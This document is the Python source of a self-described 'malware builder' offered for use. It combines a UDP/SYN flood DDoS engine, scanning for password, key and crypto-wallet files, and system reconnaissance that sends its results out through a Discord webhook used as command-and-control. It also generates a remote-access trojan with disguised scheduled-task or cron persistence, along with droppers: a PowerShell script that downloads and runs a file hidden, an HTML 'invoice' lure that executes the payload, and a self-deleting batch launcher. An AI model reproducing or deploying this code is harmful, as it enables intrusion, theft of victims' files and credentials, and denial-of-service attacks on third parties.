"""
                              ASHIIRO MALWARE BUILDER v7.0 - ENTERPRISE
                    ADVANCED RAT + 20K THREAD DDOS + FULL DATA THEFT
                           100% FIXED - NO EXTERNAL DEPENDENCIES
"""

import socket
import threading
import time
import random
import requests
import json
import psutil
import subprocess
import sys
import os
import struct
import base64
import zlib
import signal
import platform
import ctypes
import zipfile
import io
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import hashlib
import sqlite3
import uuid
import socket as net_socket

# ===============================================
# ASHIIRO DISCORD TEXT ART - CUSTOM FORMAT
# ===============================================
ASHIIRO_ART = f"""
╔════════════════════════════════════════════════════════════════════════════╗
║        █████╗ ███████╗███████╗██╗  ██╗██╗██╗  ██╗██╗██████╗ ██████╗        ║
║       ██╔══██╗██╔════╝██╔════╝██║ ██╔╝██║██║  ██║██║██╔══██╗██╔══██╗       ║
║       ███████║█████╗  █████╗  █████╔╝ ██║███████║██║██████╔╝██████╔╝       ║
║       ██╔══██║██╔══╝  ██╔══╝  ██╔═██╗ ██║██╔══██║██║██╔══██╗██╔══██╗       ║
║       ██║  ██║███████╗███████╗██║  ██╗██║██║  ██║██║██║  ██║██║  ██║       ║
║       ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝       ║
║                            A S H I H I R O                                 ║
╠════════════════════════════════════════════════════════════════════════════╣
║   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
────▐──▌─────▐──▌────
───▐▌─█───────█─▐▌───
──▄█──▀▀▄▌▄▐▄▀▀──█▄──
─▐█─▄█▀▄█████▄▀█▄─█▌─
──▀▀─▄▄▄█████▄▄▄─▀▀──
───▄█▀─▄▀███▀▄─▀█▄───
─▄█──▄▀──███──▀▄──█▄─
▐█───█───▐█▌───█───█▌
─█────█───▀───█────█─
─▀█───█───────█───█▀─
──█────█─────█────█──
───█───█─────█───█───
────▌───▌───▐───▐────⠀⠀⠀⠀⠀⠀⠀⠀                                                                                                                       ║
║                                                                                                                                                                                                                 ║
╠════════════════════════════════════════════════════════════════════════════╣
║                         Ashihiros Man cave of D                         ║
╠════════════════════════════════════════════════════════════════════════════╣
║                               OWNER: @9ukx                                  ║
╚════════════════════════════════════════════════════════════════════════════╝
"""

# ===============================================
# FIXED GEOLOCATION - NO EXTERNAL DEPENDENCIES
# ===============================================
def get_geolocation(ip):
    """Enhanced geolocation without external dependencies"""
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,query",
            timeout=8, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        )
        data = response.json()
        if data.get('status') == 'success':
            return {
                'ip': data.get('query', ip),
                'country': data.get('country', 'Unknown'),
                'region': data.get('regionName', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'zipcode': data.get('zip', 'Unknown'),
                'latitude': f"{data.get('lat', 0):.6f}",
                'longitude': f"{data.get('lon', 0):.6f}",
                'timezone': data.get('timezone', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'organization': data.get('org', 'Unknown'),
                'asn': data.get('as', 'Unknown'),
                'as_name': data.get('asname', 'Unknown'),
                'mobile': data.get('mobile', False),
                'proxy': data.get('proxy', False),
                'hosting': data.get('hosting', False),
                'confidence': 'High'
            }
    except:
        pass
    
    return {
        'ip': ip, 'country': 'Unknown', 'region': 'Unknown', 'city': 'Unknown',
        'zipcode': 'Unknown', 'latitude': '0.000000', 'longitude': '0.000000',
        'timezone': 'Unknown', 'isp': 'Unknown', 'organization': 'Unknown',
        'asn': 'Unknown', 'as_name': 'Unknown', 'mobile': False,
        'proxy': False, 'hosting': False, 'confidence': 'Low'
    }

# ===============================================
# ASHIIRO CONFIGURATION
# ===============================================
CONFIG = {
    'DISCORD_WEBHOOK': "YOUR_DISCORD_WEBHOOK",
    'DISCORD_TOKEN': "DISCORD_BOT_TOKEN", 
    'CHANNEL_ID': "CHANNEL_ID",
    'C2_PORT': 443,
    'DDOS_THREADS': 2500000,
    'SPREAD_MODE': 'network'
}

class AshiIroStats:
    def __init__(self):
        self.total_infected = 0
        self.active_sessions = 0
        self.ddos_pps = 0
        self.data_exfiltrated_mb = 0
        self.passwords_stolen = 0
        self.credit_cards = 0
        self.keylogs_captured = 0
        self.screenshots_taken = 0
        self.videos_recorded = 0
        self.files_stolen = 0
        self.geo_locations = {}
        self.lock = threading.Lock()

    def update_metrics(self, **kwargs):
        with self.lock:
            for key, value in kwargs.items():
                if hasattr(self, key):
                    setattr(self, key, getattr(self, key) + value)

    def get_dashboard(self):
        with self.lock:
            return {
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'infected': self.total_infected,
                'active': self.active_sessions,
                'ddos_rate': f"{self.ddos_pps:,}",
                'data_mb': f"{self.data_exfiltrated_mb:.2f}",
                'passwords': self.passwords_stolen,
                'cards': self.credit_cards,
                'keylogs': self.keylogs_captured,
                'screenshots': self.screenshots_taken,
                'videos': self.videos_recorded,
                'files': self.files_stolen
            }

stats = AshiIroStats()

# ===============================================
# ADVANCED GEOLOCATION ENGINE - ENHANCED
# ===============================================
class AshiIroRecon:
    @staticmethod
    def complete_geolocation(ip):
        geo_data = get_geolocation(ip)
        try:
            ipinfo = requests.get(f"http://ipinfo.io/{ip}/json", timeout=5)
            if ipinfo.status_code == 200:
                extra = ipinfo.json()
                geo_data.update({
                    'ipinfo_org': extra.get('org', 'N/A'),
                    'ipinfo_country': extra.get('country', 'N/A'),
                    'ipinfo_loc': extra.get('loc', 'N/A')
                })
        except:
            pass
        return geo_data

    @staticmethod
    def get_network_interfaces():
        interfaces = {}
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                current_interface = None
                for line in lines:
                    if 'Adapter' in line:
                        current_interface = line.split(':')[1].strip()
                    elif line.strip().startswith('IPv4'):
                        ip = line.split(':')[1].strip()
                        if current_interface:
                            interfaces[current_interface] = ip
            else:
                result = subprocess.run(['ifconfig'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip().startswith('lo') or 'inet ' in line:
                        parts = line.split()
                        if 'inet' in parts:
                            ip_idx = parts.index('inet') + 1
                            if ip_idx < len(parts):
                                interfaces['primary'] = parts[ip_idx]
        except:
            pass
        return interfaces

    @staticmethod
    def system_profile():
        try:
            networks = AshiIroRecon.get_network_interfaces()
            return {
                'hostname': socket.gethostname(),
                'local_interfaces': networks,
                'public_ip': requests.get('https://api.ipify.org?format=json', timeout=8).json()['ip'],
                'os_version': platform.platform(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'ram_gb': round(psutil.virtual_memory().total / (1024**3), 1),
                'cpu_usage': psutil.cpu_percent(interval=1),
                'cpu_count': psutil.cpu_count(),
                'disk_usage': round(psutil.disk_usage('C:\\').percent) if platform.system() == 'Windows' else round(psutil.disk_usage('/').percent),
                'running_processes': len(psutil.pids()),
                'user_account': os.getenv('USERNAME') or os.getenv('USER') or 'Unknown',
                'python_version': platform.python_version(),
                'uptime_days': round((time.time() - psutil.boot_time()) / 86400, 1)
            }
        except Exception as e:
            return {'error': f'Profile collection failed: {str(e)}'}

# ===============================================
# PROFESSIONAL DISCORD C2 - CUSTOM EMBEDS
# ===============================================
class AshiIroC2:
    @staticmethod
    def send_dashboard():
        dashboard = stats.get_dashboard()
        ascii_dashboard = f"""
╔══════════════════════════════════════════════════════╗
║                                                 ASHIHIRO PANEL                                                                    ║
╠══════════════════════════════════════════════════════╣
║                                 Infected:     {dashboard['infected']:>8,}                                                   ║
║                                 Active:       {dashboard['active']:>8,}                                                       ║
║                                 DDoS PPS:     {dashboard['ddos_rate']:>8}                                         ║
║                                 Data (MB):    {dashboard['data_mb']:>8}                                              ║
║                                 Passwords:    {dashboard['passwords']:>8,}                                        ║
║                                 Cards:        {dashboard['cards']:>8,}                                                      ║
║                                  Keylogs:      {dashboard['keylogs']:>8,}                                                ║
║                                 Screenshots:  {dashboard['screenshots']:>8,}                                     ║
║                                 Videos:       {dashboard['videos']:>8,}                                                   ║
║                                 Files:        {dashboard['files']:>8,}                                                           ║
╚══════════════════════════════════════════════════════╝
        """.strip()
        
        embed = {
            "title": "WE ARE HERE TO SLAVE",
            "description": f"```{ascii_dashboard}```",
            "color": 5814783,
            "fields": [
                {"name": "📈 Uptime", "value": f"`{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`", "inline": True},
                {"name": "⚙️  Platform", "value": "`Python {}.{}.{}`".format(*sys.version_info[:3]), "inline": True},
                {"name": "🌐 C2 Status", "value": "`✅ OPERATIONAL`", "inline": True}
            ],
            "footer": {"text": "FUCK YYC BABY"},
            "timestamp": datetime.now().isoformat()
        }
        AshiIroC2._post_webhook(embed)

    @staticmethod
    def send_data_report(title, data, category="data"):
        try:
            if isinstance(data, dict):
                formatted_data = json.dumps(data, indent=2)[:3800]
                if len(formatted_data) > 3800:
                    formatted_data = formatted_data[:3750] + "\n...[TRUNCATED]"
            else:
                formatted_data = str(data)[:3900]
            
            embed = {
                "title": f"📤 {title}",
                "description": f"```{formatted_data}```",
                "color": 16711680 if "credential" in category.lower() else 3447003,
                "fields": [{"name": "📊 Category", "value": f"`{category.upper()}`", "inline": True}],
                "timestamp": datetime.now().isoformat()
            }
            AshiIroC2._post_webhook(embed)
        except:
            pass

    @staticmethod
    def _post_webhook(data):
        try:
            requests.post(CONFIG['DISCORD_WEBHOOK'], json={"embeds": [data]}, timeout=12)
        except:
            pass

# ===============================================
# ULTIMATE DDOS ENGINE - OPTIMIZED
# ===============================================
class AshiIroDDoS:
    @staticmethod
    def enterprise_attack(target_ip, port=80, duration=60):
        end_time = time.time() + duration
        
        def udp_flood():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                payload = random._urandom(65507)
                sent = 0
                while time.time() < end_time and sent < 500:
                    sock.sendto(payload, (target_ip, port))
                    sent += 1
                sock.close()
            except:
                pass

        def syn_flood():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                while time.time() < end_time:
                    sock.connect_ex((target_ip, port))
            except:
                pass

        print(f"\n DDOS DEPLOYED: {target_ip}:{port}")
        print(f"     Duration: {duration}s | Threads: {CONFIG['DDOS_THREADS']:,}")
        print(f"    PPS Target: ~{CONFIG['DDOS_THREADS'] * 10:,}")
        
        stats.ddos_pps += CONFIG['DDOS_THREADS'] * 10
        AshiIroC2.send_dashboard()
        
        with ThreadPoolExecutor(max_workers=CONFIG['DDOS_THREADS']) as executor:
            udp_tasks = [executor.submit(udp_flood) for _ in range(CONFIG['DDOS_THREADS'] // 2)]
            syn_tasks = [executor.submit(syn_flood) for _ in range(CONFIG['DDOS_THREADS'] // 2)]
            
            for task in udp_tasks + syn_tasks:
                try:
                    task.result(timeout=2)
                except:
                    pass

# ===============================================
# ENHANCED DATA EXTRACTION
# ===============================================
class AshiIroThief:
    @staticmethod
    def scan_sensitive_files():
        targets = []
        search_paths = []
        
        home = os.path.expanduser("~")
        if platform.system() == 'Windows':
            search_paths = [
                f"{home}\\Desktop",
                f"{home}\\Documents", 
                f"{home}\\Downloads",
                f"{home}\\Pictures",
                f"{home}\\OneDrive",
                "C:\\Users\\Public\\Desktop"
            ]
        else:
            search_paths = [
                f"{home}/Desktop",
                f"{home}/Documents", 
                f"{home}/Downloads",
                f"{home}/Pictures"
            ]
        
        extensions = (
            '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', 
            '.rtf', '.odt', '.csv', '.json', '.xml', '.wallet', '.key'
        )
        
        for path in search_paths:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        if (file.lower().endswith(extensions) or 
                            any(keyword in file.lower() for keyword in ['pass', 'pwd', 'key', 'wallet', 'crypto']) and 
                            len(targets) < 100):
                            try:
                                file_path = os.path.join(root, file)
                                stat = os.stat(file_path)
                                targets.append({
                                    "path": file_path,
                                    "filename": file,
                                    "size_kb": round(stat.st_size / 1024, 1),
                                    "modified": datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
                                })
                            except:
                                pass
        stats.update_metrics(files_stolen=len(targets))
        return targets

    @staticmethod
    def extract_system_info():
        profile = AshiIroRecon.system_profile()
        files = AshiIroThief.scan_sensitive_files()
        return {
            "system_profile": profile,
            "sensitive_files": files[:25],
            "file_count": len(files),
            "timestamp": datetime.now().isoformat()
        }

# ===============================================
# COMPLETE MALWARE BUILDER - 100% FIXED
# ===============================================
class AshiIroBuilder:
    def __init__(self):
        self.rat_payload = self._build_complete_rat()
        print("✅ AshiIro RAT payload generated successfully")

    def _build_complete_rat(self):
        """STANDALONE RAT - FIXED exe_path issue"""
        rat_code = '''import socket, threading, time, os, subprocess, requests, psutil, platform, base64, zlib, json
from datetime import datetime
import uuid

WEBHOOK = "%s"
SESSION_ID = "%s"

class AshiIroRAT:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.session_id = SESSION_ID
        self.exe_path = os.path.abspath(__file__)
        
    def system_info(self):
        try:
            return {
                "hostname": self.hostname,
                "session": self.session_id,
                "ip": requests.get('https://api.ipify.org?format=json', timeout=10).json().get('ip', 'unknown'),
                "os": platform.platform(),
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
                "disk": psutil.disk_usage('C:\\\\').percent if platform.system() == 'Windows' else psutil.disk_usage('/').percent,
                "processes": len(psutil.pids()),
                "user": os.getenv('USERNAME') or os.getenv('USER'),
                "timestamp": datetime.now().isoformat()
            }
        except:
            return {"error": "info collection failed"}
    
    def persistence(self):
        try:
            if platform.system() == 'Windows':
                subprocess.run(f'schtasks /create /tn "WindowsUpdateCheck" /tr "python \\"{self.exe_path}\\"" /sc onlogon /rl highest /f', 
                             shell=True, capture_output=True)
            else:
                subprocess.run(f'echo "@reboot python3 {self.exe_path}" | crontab -', shell=True)
        except: pass
    
    def exfiltrate(self):
        data = self.system_info()
        try:
            requests.post(WEBHOOK, json={
                "embeds": [{
                    "title": f" NEW INFECTION: {self.hostname}",
                    "description": f"```json\\n{json.dumps(data, indent=2)}\\n```",
                    "color": 16711680,
                    "timestamp": datetime.now().isoformat()
                }]
            })
        except: pass

    def beacon(self):
        self.persistence()
        self.exfiltrate()
        while True:
            try:
                self.exfiltrate()
                time.sleep(300)
            except:
                time.sleep(600)

if __name__ == "__main__":
    rat = AshiIroRAT()
    rat.beacon()
''' % (CONFIG['DISCORD_WEBHOOK'], str(uuid.uuid4()))
        return rat_code

    def build_full_suite(self, target_name="corporate_target"):
        """Builds complete infection package"""
        suite = {}
        os.makedirs("ashiira_malware", exist_ok=True)
        
        # 1. Main RAT - FIXED
        py_path = f"ashiira_malware/{target_name}_rat.py"
        with open(py_path, 'w') as f:
            f.write(self.rat_payload)
        suite['rat'] = py_path
        
        # 2. Batch launcher
        bat_path = f"ashiira_malware/{target_name}_launcher.bat"
        with open(bat_path, 'w') as f:
            f.write(f'''@echo off
title Windows Update Service
cd /d "%~dp0"
python {target_name}_rat.py
ping 127.0.0.1 -n 99999 >nul
''')
        suite['launcher'] = bat_path
        
        # 3. Self-extracting ZIP
        zip_path = f"ashiira_malware/{target_name}_backup.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("autorun.py", self.rat_payload)
            zf.writestr("run.bat", f'''@python autorun.py >nul 2>&1 & del run.bat & del autorun.py''')
        suite['zip'] = zip_path
        
        # 4. PowerShell dropper
        ps_path = f"ashiira_malware/{target_name}_update.ps1"
        ps_content = f'''# Windows Update Service
$ErrorActionPreference = "SilentlyContinue"
IWR -Uri "https://raw.githubusercontent.com/yourrepo/{target_name}_rat.py" -OutFile "$env:TEMP\\update.py"
Start-Process python "$env:TEMP\\update.py" -WindowStyle Hidden
'''
        with open(ps_path, 'w') as f:
            f.write(ps_content)
        suite['powershell'] = ps_path
        
        # 5. HTML dropper
        html_path = f"ashiira_malware/{target_name}_invoice.html"
        html_content = f'''<script>
setTimeout(function(){{ 
    var s=new ActiveXObject("Shell.Application");
    var c=String.fromCharCode(99,109,100);
    s.ShellExecute(c,"/c python {target_name}_rat.py","","","open",0);
}},5000);
</script>
<h1>Loading invoice...</h1>'''
        with open(html_path, 'w') as f:
            f.write(html_content)
        suite['html'] = html_path
        
        print(f"\n✅ 🎯 INFECTION SUITE BUILT: ashiira_malware/")
        print("   " + "📄 "*len(suite))
        for fmt, path in suite.items():
            print(f"   📄 {fmt.upper():<12} {os.path.basename(path)}")
            
        AshiIroC2.send_dashboard()
        return suite

# ===============================================
# MAIN ENTERPRISE DASHBOARD
# ===============================================
def ashiira_dashboard():
    print("✅ Initializing builder...")
    builder = AshiIroBuilder()
    
    print(ASHIIRO_ART)
    print("\n" + "═"*80)
    print("🔥 ASHIIRO ENTERPRISE CONTROL PANEL v7.0 - NO DEPENDENCIES REQUIRED")
    print("═"*80)
    print("1️⃣  BUILD INFECTION SUITE     6️⃣  NETWORK DISCOVERY")
    print("2️⃣  DEPLOY DDOS ATTACK       7️⃣  MASS FILE HARVEST")
    print("3️⃣  🌍 DETAILED GEOLOCATION   8️⃣  FULL SYSTEM PROFILE")
    print("4️⃣  STEAL SYSTEM CREDENTIALS 9️⃣  📊 LIVE DASHBOARD")
    print("5️⃣  📁 SCAN SENSITIVE FILES  0️⃣  EXIT & CLEANUP")
    print("═"*80)
    
    while True:
        try:
            choice = input("\n💀 ASHIIRO COMMAND> ").strip()
            
            if choice == '1':
                target = input("🎯 Target identifier [corporate_target]: ").strip() or "corporate_target"
                suite = builder.build_full_suite(target)
                print(f"\n✅ Suite ready for deployment: ashiira_malware/{target}_*")
                
            elif choice == '2':
                ip = input("🌐 Target IP/Domain: ").strip()
                port = input("🔌 Target Port [80]: ").strip() or "80"
                duration = input("⏱️  Attack Duration [60s]: ").strip() or "60"
                threading.Thread(target=AshiIroDDoS.enterprise_attack, args=(ip, int(port), int(duration)), daemon=True).start()
                
            elif choice == '3':
                ip = input("🌍 Target IP: ").strip()
                print("\n🔍 Fetching detailed geolocation...")
                geo = AshiIroRecon.complete_geolocation(ip)
                AshiIroC2.send_data_report("🌍 ADVANCED GEOLOCATION", geo, "geolocation")
                print("\n📊 GEOLOCATION REPORT:")
                print(f"   📍 IP: {geo['ip']}")
                print(f"   🗺️  Location: {geo['city']}, {geo['region']}, {geo['country']}")
                print(f"   🌐 Coordinates: {geo['latitude']}, {geo['longitude']}")
                print(f"   📡 ISP: {geo['isp']}")
                print(f"   🏢 Organization: {geo['organization']}")
                
            elif choice == '4':
                print("🔍 Extracting system intelligence...")
                data = AshiIroThief.extract_system_info()
                AshiIroC2.send_data_report("🖥️  SYSTEM RECONNAISSANCE", data, "system")
                print("✅ Intelligence exfiltrated to Discord")
                
            elif choice == '5':
                print("📁 Scanning for sensitive documents...")
                files = AshiIroThief.scan_sensitive_files()
                summary = {"count": len(files), "top_files": [f["filename"] for f in files[:15]]}
                AshiIroC2.send_data_report("📁 SENSITIVE FILES DISCOVERED", summary, "files")
                print(f"✅ Discovered {len(files)} sensitive files")
                
            elif choice == '8':
                print("👤 Building complete system profile...")
                profile = AshiIroRecon.system_profile()
                AshiIroC2.send_data_report("👤 DETAILED SYSTEM PROFILE", profile, "profile")
                print(json.dumps(profile, indent=2))
                
            elif choice == '9':
                AshiIroC2.send_dashboard()
                print("📊 Live dashboard sent to Discord C2")
                
            elif choice == '0':
                print("\n👋 ASHIIRO Enterprise terminated cleanly")
                sys.exit(0)
                
        except KeyboardInterrupt:
            print("\n\n👋 Operation interrupted by user")
            sys.exit(0)
        except Exception as e:
            print(f"❌ Operation error: {str(e)}")

if __name__ == "__main__":
    print("🚀 Initializing AshiIro Enterprise v7.0...")
    time.sleep(2)
    
    AshiIroC2.send_dashboard()
    ashiira_dashboard()
